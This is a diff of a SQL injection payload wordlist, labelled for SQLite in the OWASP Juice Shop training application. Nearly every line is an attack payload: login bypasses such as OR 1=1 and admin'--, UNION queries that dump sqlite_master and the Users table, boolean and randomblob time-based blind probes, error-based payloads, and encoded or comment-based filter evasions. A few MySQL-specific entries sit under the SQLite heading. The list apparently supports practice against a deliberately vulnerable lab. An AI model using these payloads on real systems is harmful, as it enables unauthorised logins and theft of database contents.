@@ -1,21 +1,33 @@
+# SQL Injection Payloads for SQLite (Juice Shop)
+# Basic OR-based injections
 ' OR '1'='1
 ' OR 1=1--
 ' OR 1=1#
 ' OR 1=1/*
-') OR '1'='1--
-') OR ('1'='1--
-' OR 1=1 LIMIT 1--
-' OR 1=1 ORDER BY 1--
-' OR 1=1 UNION SELECT null--
-' UNION SELECT sqlite_version()--
-' UNION SELECT name FROM sqlite_master WHERE type='table'--
-' UNION SELECT sql FROM sqlite_master--
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR 'a'='a
+' OR 'a'='a'--
+' OR 'a'='a'#
 ' OR ''='
 ' OR 1--
 ' OR 1#
 ' OR 1/*
-') OR ('1
+"" OR 1=1--
+"" OR ""=""
+"" OR 1=1#
+
+# Parentheses-based injections
+') OR '1'='1--
+') OR ('1'='1--
+') OR 1=1--
+') OR ('1'='1
 ') OR 1=1#
+"") OR ""=""--
+"") OR 1=1--
+
+# Admin-based payloads
 admin'--
 admin'/*
 admin' OR '1'='1
@@ -31,7 +43,30 @@ admin') OR ('1'='1
 admin') OR ('1'='1'--
 admin') OR ('1'='1'#
 admin') OR ('1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+# UNION-based injections
+' UNION SELECT sqlite_version()--
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+' UNION SELECT name FROM sqlite_master WHERE type='table'--
+' UNION SELECT sql FROM sqlite_master--
+' UNION SELECT tbl_name FROM sqlite_master WHERE type='table'--
+-1' UNION SELECT 1,2,3--
+1' UNION SELECT null,version(),null--
+
+# ORDER BY injections
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 1,2--
+' ORDER BY 1,2,3--
+
+# SQLite-specific payloads
+' OR rowid=1--
+' OR oid=1--
+' OR _rowid_=1--
 ' AND (SELECT COUNT(*) FROM sqlite_master)>0--
 ' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)='Users'--
 ' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='Users')=1--
@@ -39,14 +74,81 @@ admin') OR ('1'='1'/*
 ' OR EXISTS(SELECT * FROM sqlite_master WHERE type='table' AND name='Users')--
 ' OR (SELECT SUBSTR(name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1)='U'--
 ' OR (SELECT SUBSTR(sql,1,6) FROM sqlite_master WHERE type='table' AND name='Users')='CREATE'--
-' OR (SELECT COUNT(*) FROM Users)>0--
-' OR (SELECT COUNT(*) FROM Users WHERE email LIKE '%admin%')>0--
-' OR email='admin@juice-sh.op'--
-' OR email LIKE '%admin%'--
+
+# Email-specific payloads
 test@test.com'--
 test@test.com' OR '1'='1
 test@test.com' OR 1=1--
 test@test.com') OR ('1'='1
-' OR rowid=1--
-' OR oid=1--
-' OR _rowid_=1--
+admin@admin.com'--
+admin@admin.com' OR 1=1--
+user@example.com' OR '1'='1'--
+
+# Juice Shop specific
+' OR email='admin@juice-sh.op'--
+' OR email LIKE '%admin%'--
+admin@juice-sh.op'--
+admin@juice-sh.op' OR 1=1--
+
+# Database enumeration
+' OR (SELECT COUNT(*) FROM Users)>0--
+' OR (SELECT COUNT(*) FROM Users WHERE email LIKE '%admin%')>0--
+' AND (SELECT COUNT(*) FROM Users)>1--
+' OR (SELECT email FROM Users LIMIT 1)='admin@juice-sh.op'--
+
+# Boolean-based blind
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+' AND (SELECT LENGTH(email) FROM Users LIMIT 1)>5--
+
+# Time-based blind (SQLite specific)
+' AND (SELECT COUNT(*) FROM sqlite_master)>0 AND randomblob(100000000)--
+' OR CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END--
+
+# Comment variations
+'-- 
+'#
+'/*
+'%00
+';%00
+
+# Special characters and encoding
+%27%20OR%201=1--
+%27%20OR%20%271%27=%271
+%22%20OR%201=1--
+'/**/OR/**/1=1--
+'--
+'/**/--
+' OR 1=1--+
+' OR '1'='1'--+
+
+# Error-based
+' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# Complex payloads
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 UNION SELECT null--
+' OR 1=1 GROUP BY 1--
+
+# Numeric contexts
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+1' OR '1'='1
+1' OR 1=1--
+1' OR 1=1#
+
+# Additional bypass attempts
+' OR 'x'='x
+' OR "x"="x"
+' OR `x`=`x`
+' OR [x]=[x]
+' OR (1)=(1)
+' OR 1 LIKE 1
+' OR 1 RLIKE 1
+' OR 1 REGEXP 1
